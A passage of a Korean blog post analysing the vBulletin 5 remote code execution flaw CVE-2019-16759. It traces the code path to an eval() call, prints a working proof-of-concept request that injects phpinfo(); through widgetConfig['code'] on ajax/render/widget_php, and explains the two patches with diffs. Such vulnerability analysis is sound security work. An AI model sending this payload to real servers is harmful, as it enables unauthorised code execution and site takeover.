class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure><p><strong>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 __construct 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.</strong><br></p><p><strong>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</strong><br><br></p><p><strong>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</strong><br><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p><strong>그리고 사용자 값을 받을 때, $_REQUEST를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 vB5_Frontend_ApplicationLight::init가 실행 돼 __construct 메서드가 실행이 될 것이고, __construct 메서드에서도 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  widget_php 템플릿으로 전송이 됩니다. widget_php에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a><em>CVE-2019-16759 Patch</em></h2><p><strong>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p><strong>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span 